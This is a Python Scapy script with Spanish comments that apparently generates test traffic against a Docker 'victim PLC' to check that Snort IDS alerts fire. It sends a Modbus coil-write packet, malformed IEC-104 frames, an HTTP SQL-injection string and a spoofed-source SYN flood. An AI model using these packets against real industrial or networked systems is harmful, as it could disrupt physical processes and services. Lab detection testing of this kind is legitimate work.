import sys
import time
import random
from scapy.all import *

# === CONFIGURACIÓN ===
# Pon aquí la IP que obtuviste en el Paso 2
TARGET_IP = "172.18.0.7" 

def check_victim_alive():
    """Verifica que la víctima está respondiendo antes de atacar"""
    print(f"🔍 Verificando conectividad con {TARGET_IP}...")
    ans, unans = sr(IP(dst=TARGET_IP)/ICMP(), timeout=2, verbose=0)
    if ans:
        print("   ✅ Objetivo activo. Iniciando secuencia.")
        return True
    else:
        print("   ❌ El objetivo no responde. Revisa la IP o la red Docker.")
        return False

def attack_scada_modbus():
    print(f"\n🏭 [SCADA] Simulando tráfico Modbus/TCP malicioso...")
    # Tráfico al puerto 502
    for _ in range(5):
        # Paquete TCP con flag PSH (Push) simula envío de datos
        pkt = IP(dst=TARGET_IP)/TCP(dport=502, flags="PA")/b"\x00\x01\x00\x00\x00\x06\x01\x05\x00\x01\xFF\x00"
        send(pkt, verbose=0)
        time.sleep(0.1)
    print("   -> Paquetes Modbus enviados.")

def attack_scada_iec104():
    print(f"\n⚡ [SCADA] Inyectando anomalía en IEC-104...")
    # Tráfico al puerto 2404 con payload que activa tu regla Snort
    # El payload contiene el byte de inicio 0x68 y basura después
    payload = b'\x68\x04\x07\x00\x00\x00' 
    
    for _ in range(10):
        pkt = IP(dst=TARGET_IP)/TCP(dport=2404, flags="PA")/payload
        send(pkt, verbose=0)
        time.sleep(0.05)
    print("   -> Anomalía IEC-104 enviada.")

def attack_web_exploit():
    print(f"\n☠️ [WEB] Lanzando intento de Exploit...")
    # Intento de SQL Injection simple y palabra clave "exploit"
    payload = "GET /login?user=admin' OR 1=1 -- exploit HTTP/1.1\r\nHost: plc\r\n\r\n"
    
    pkt = IP(dst=TARGET_IP)/TCP(dport=80, flags="PA")/payload
    send(pkt, verbose=0)
    print("   -> Payload de exploit enviado.")

def attack_dos_flood():
    print(f"\n🔥 [DoS] Iniciando saturación de red (SYN Flood)...")
    print("   -> Enviando 100 paquetes rápidos...")
    
    for i in range(100):
        src_port = random.randint(1024, 65535)
        # Spoofing de IP (opcional, pero realista)
        fake_src = f"10.10.{random.randint(1,255)}.{random.randint(1,255)}"
        
        pkt = IP(src=fake_src, dst=TARGET_IP)/TCP(sport=src_port, dport=2404, flags="S")
        send(pkt, verbose=0)
        
    print("   -> Ataque DoS completado.")

if __name__ == "__main__":
    print("=============================================")
    print(f"   ATAQUE QUIRÚRGICO A CONTENEDOR DE PRUEBA")
    print(f"   Objetivo: {TARGET_IP} (Victim PLC)")
    print("=============================================")
    
    # Verificación de seguridad
    if input("¿Confirmas que esta es la IP del contenedor de prueba? (s/n): ").lower() != 's':
        sys.exit()

    if check_victim_alive():
        attack_scada_modbus()
        time.sleep(1)
        attack_scada_iec104()
        time.sleep(1)
        attack_web_exploit()
        time.sleep(1)
        attack_dos_flood()
        
        print("\n✅ PRUEBA FINALIZADA.")
        print("El tráfico pasó por la red Docker.")
        print("Snort debió interceptarlo y alertar al Dashboard.")